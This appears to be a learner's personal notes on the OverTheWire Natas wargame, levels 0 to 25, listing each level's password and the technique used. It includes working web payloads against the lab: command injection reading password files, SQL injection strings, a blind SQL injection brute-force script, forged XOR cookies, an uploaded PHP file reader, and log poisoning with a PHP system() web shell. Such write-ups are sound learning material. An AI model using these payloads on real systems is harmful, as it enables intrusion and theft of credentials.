so lets do natas again. I reached natas 30 but I did use AI for some levels. Like after trying ofc.

###### natas0
natas0
natas0
The pass was hidden as a commend in the HTML code.

###### natas1
natas1
scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
The pass was in the same place, but rightclick was blocked. F12.

###### natas2
natas2
vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
Pass was hidden in the /files/ subdirectory. there as an image called pixel.png and the directory was open. pass was inside users.txt

###### natas3
natas3
K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
I went to the robots.txt file since it was a clue from the "not even Google will find it"
subdirectory /secrets/ or whatever and the pass was there

###### natas4
natas4
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
I am thinking about changing/adding the referrer with burp suite.
yep: Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M

###### natas5
natas5
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
There is a cookie called loggedin with a value of 0. Changed it to 1 and got:
Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

###### natas6
natas6
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

We get a screen with an input and submit form. No cookies.
Maybe a command injection? maybe lets just call nataspass?
i tried " echo file_get_contents(/etc/natas_webpass/natas7");
the input is a text in a function. we need to break out of that function. Thats a command injection?
I am a dumbass, there is source code for this level.
It seems like we need to manipulate and use secret.inc
or... just open it?
[natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)
FOEIUWGHFEEUHOFUOIU
Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
So far no code. lol.

###### natas7
natas7
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0

[natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
solved in 10 seconds.

###### natas8
natas8
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc

we have this php code:
  
`$encodedSecret = "3d3d516343746d4d6d6c315669563362";`  
  
`function encodeSecret($secret) {`  
    `return bin2hex(strrev(base64_encode($secret)));`  
`}`  
  
`if(array_key_exists("submit", $_POST)) {`  
    `if(encodeSecret($_POST['secret']) == $encodedSecret) {`  
    `print "Access granted. The password for natas9 is <censored>";`  
    `} else {`  
    `print "Wrong secret";`  
    `}`  
`}`  

decode and submit the secret.

decode base64 - strrev - hex2bin

lets run it in php online even just for good measure.

`<?php`

`function decodeSecret() {`
    `$encodedSecret = "3d3d516343746d4d6d6c315669563362";`

    `$decodedSecret = base64_decode(strrev(hex2bin($encodedSecret)));`

    `return $decodedSecret;`
`}`

`echo decodeSecret();`
`?>`

output: oubWYf2kBq
Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

###### natas9
natas9
UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

`<?`  
`$key = "";`  
  
`if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];`  
`}`  
  
`if($key != "") {    passthru("grep -i $key dictionary.txt");`  
`}`  
`?>`

Code Injection!

&cat /etc/natas_webpass/natas10
With burp suite for fuzzing.

EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

###### natas10
natas10
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

it seems like they are filtering some characters now.
no  \`

http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20/etc/natas_webpass/natas11&submit=Search
after some fuzzing with burpsuite.
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd

###### natas11
natas11
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
(27.6.26 12:56)
We have an interface where I can change the background color.
it saves the data in a cookie named "data". It is encryped with XOR encryption.
From reading the code at first glance (and I am not a great programmer by any means), I think the data has both fields for background color and show password = false/no/whatever.
I think I will try to decrypt it using what I know, I have the encoded text and the data that should be in it, and then to make a cookie with show password = yes.
This is my current approach.
the cookie is built like that:

save data:
json encode - xor encrypt - base64 encode
according to the code, this is the default data in json.
{"showpassword":"no","bgcolor":"#ffffff"}
if we encrypt with the cookie as the key we can calculate the key.
I will do it in php. Why tf am i doing it in php online? meh

I ran this code:
`<?php`
`$key = base64_decode("EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=");`
`$text = '{"showpassword":"no","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print $outText;`
`?>`

output: kBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwk
So the key is kBSw
Now we can create our own cookie!

Code:
`<?php`
`$key = "kBSw";`
`$text = '{"showpassword":"yes","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print base64_encode($outText); // Print as base64 encode ready for cookie`
`?>`

output: EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/
We enter the cookie and we get this!!!
Cookies are protected with XOR encryption  
  
The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

So proud of myself for real! Last time I did this level I couldn't even recreate this with ChatGPT. The trick is to try harder, use the functions you have with php and try to really understand what you need to do.

###### natas12
natas12
EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

We need to upload a file and then we can view it. RCE?
I created a file with this code: 
`<?php`
`$filename = '/etc/natas_webpass/natas13';`
`$content = file_get_contents($filename);`
`if ($content !== false) {`
    `echo $content;`
`} else {`
    `echo "Error: Could not read file.";`
`}`
`?>`

And captured the http request and edited the file extension from jpg to .php.

output: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

###### natas13
natas13
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

For security reasons, we now only accept image files!
Lets change the file header to a photo magic header. I remember this trick from last run, basically the code in this challange checks the header of the file for data to indicate that it's a photo.

output: GIF89a; A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8

###### natas14
natas14
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
(28.6.26 14:09)
I'll try to do at least 2 levels today before imma head home.

It was easy. like its 14:10 now. It was a login extremely valuable to SQL injection.
Hit him with that `" or ""="`
no sanitizations, no escaping, nothing.
Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

###### natas15
natas15
GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

I remember this level. Basically I can ask if natas15 exists and his password starts with A. It will go through a-z A-Z 0-9. Lets say it starts with z
After i get a hit, I will rerun this script with z in the beginning. Passwords are 32 chars long.
I gave chatgpt the script i wrote and it gave me a much faster version:
Python script:

`import requests`

`from concurrent.futures import ThreadPoolExecutor, as_completed`

  

`URL = "http://natas15.natas.labs.overthewire.org/index.php"`

`AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")`

  

`session = requests.Session()`

`session.auth = AUTH`

  
  

`def get_char(position):`

    `low = 32`

    `high = 126`

  

    `while low <= high:`

        `mid = (low + high) // 2`

  

        `payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1)) > {mid} -- '`

  

        `response = session.post(`

            `URL,`

            `data={"username": payload},`

            `timeout=10`

        `)`

  

        `if "This user exists" in response.text:`

            `low = mid + 1`

        `else:`

            `high = mid - 1`

  

    `return position, chr(low)`

  
  

`password = ["?"] * 32`

  

`with ThreadPoolExecutor(max_workers=16) as executor:`

    `futures = [executor.submit(get_char, i) for i in range(1, 33)]`

  

    `for future in as_completed(futures):`

        `pos, ch = future.result()`

        `password[pos - 1] = ch`

        `print(f"[{pos:02}] -> {ch} | Current: {''.join(password)}")`

  

`print("\nPassword:", "".join(password))`

###### natas16
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
Basically the same script, but we are passing a grep command inside the $key.
$(grep ^{attempt} /etc/natas_webpass/natas17)
if valid then it will return no results. Script is saved in my natas folder.
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx

###### natas17
natas17
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
Its a check user code but it doesnt print anything. So i am thinking about sleep based oracle.
Of course, I remember it from the last time I did this lol. Call it pattern recognition.
Ill do it tomorrow. I will go home soon!
30.6.26 8:41
I tried many approaches, not enough. I ended up using the old script and SQL phrasing. My idea was correct, it was just a matter of syntex.
I don't call it cheating, but ChatGPT did the syntex not gonna lie.
Still, my idea was correct.
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

###### natas18
natas18
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op

There is a login page. I need to get into an admin session to get the password for natas19
I want to try to bruteforce the cookie. Between 0 - 640.
Shouldn't take long.
Yep. Did it with burp suite. Cookie number 119.
You are an admin. The credentials for the next level are:
Username: natas19
Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

###### natas19
natas19
qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT

This time it seems like the cookie is encoded.

I have a cookie of example:example
3133352d6578616d706c65

the cookie decoded is: number - username
According to isValodID function.
Isn't it great that they left the code for encryption and decryption?
This is my cookie decoded:
`$h = "3133352d6578616d706c65";`

`function myhex2bin($h) {`
  `if (!is_string($h)) return null;`
  `$r='';`
  `for ($a=0; $a<strlen($h); $a+=2) {`
    `$r .= chr(hexdec($h[$a].$h[$a+1]));`
  `}`
  `return $r;`
`}`

`echo myhex2bin($h);`
`?>`
all we need is to create a cookie with admin as the name!
69 - admin. encoded to hex: 36392d61646d696e
it doesnt work. maybe i need to use a valid id?
doesnt work either.
Lets bruteforce with the known encryption
0-640-admin.

[+] Found valid ID: 281
[+] Payload: 3238312d61646d696e

You are an admin. The credentials for the next level are:  

Username: natas20
Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao

###### natas20
natas20
slOKYGsjlJhaqKliGvrgWAzln0JyrWao

So basically the same thing.
The session is being saved via session_save_path() which in default is /tmp/

We run a brute-force check to http://natas20.natas.labs.overthewire.org/tmp/mysess_{i}-admin
with i being a-z, A-Z, 0-9

Well, I wasnt even close.

payload: name=admin%0aadmin+1
this is supposed to get the data to
name = admin
admin 1
as the session name.
basically newline injection and session something something.
meh.

Username: natas21
Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU

###### natas21
natas21
7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU

There are two pages. One is a regular one which will change once i enter an admin session, the other one I can just change the colors of the page. My guess is session injection or newline injection from the fields in the other page.
YES!
So what i did was capture the request on each pages.
I added admin=1 to the POST request. Then i copied that cookie to the main page to use the same session. And i got this:
You are an admin. The credentials for the next level are:
Username: natas22
Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF

###### natas22
natas22
964laB0r7TuDqJj5b3HFtwsQoc0GhjBF

We are met with an empty page. It will print the credentials once I am admin.
I will get admin once I invoke the revelio session.
I send a request of ?revelio=1
When I intercept the response it showed me the credentials!
Username: natas23
Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5

the login in this levels is that if I am not admin when invoking the revelio function, it should redirect me immediately. Because I was able to capture the response before the redirection, it trusted that only admin can invoke the function. Or something like that.

###### natas23
natas23
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5

we need to input the password iloveyou but also make it 10 chars long.
using the regular browser with spaces doesn't work.
I'll search on stack exchange.
Oh! once I tried to treat passwd as an array I got this
**Warning**: strstr() expects parameter 1 to be string, array given in **/var/www/natas/natas23/index.php** on line **23**
Maybe this is the way to solve it?
Also, in the code `$_REQUEST["passwd"] > 10` this is comparing strings to numbers.

[natas23.natas.labs.overthewire.org/?passwd=11iloveyou](http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou)
The credentials for the next level are:  

Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX

Here we both have 11 > 10 and iloveyou! Payload by me ofc.

###### natas24
natas24
shlL4BvOtawNCd81dwdKRHFzmTEjYYQX

`<?php    if(array_key_exists("passwd",$_REQUEST)){`  
        `if(!strcmp($_REQUEST["passwd"],"<censored>")){`  
            `echo "<br>The credentials for the next level are:<br>";`  
            `echo "<pre>Username: natas25 Password: <censored></pre>";`  
        `}`  
        `else{`  
            `echo "<br>Wrong!<br>";`  
        `}`  
    `}    // morla / 10111`  
`?>`

I will try something similar.
[natas24.natas.labs.overthewire.org/?passwd[]=11iloveyou](http://natas24.natas.labs.overthewire.org/?passwd[]=11iloveyou)
The credentials for the next level are:  

Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo

Another example of type juggling.

###### natas25
natas25
UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo

This website blocks path traversal from the languege selection.
I do remember something with the user agent, but I am not going to do it now. I am going to it. Probably poison the log by changing the user agent to /etc/natas_webpass/natas26 or something.

/?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log

`<?php system($_GET['cmd']); ?>`

request:
GET /?lang=....//logs/natas25_srjojurrnasl91j7q63c9fo6dt.log&cmd=cat%20/etc/natas_webpass/natas26 HTTP/1.1
Host: natas25.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw==
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=srjojurrnasl91j7q63c9fo6dt
Connection: keep-alive

3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT

bruh. tough level. I should keep in mind that RCE backdoor cmd thingie. Windows Defender marked this line as a virus lol

I use chat for syntax. I did understand the exploit, just I didnt remember the exact syntex to do it.

###### natas26

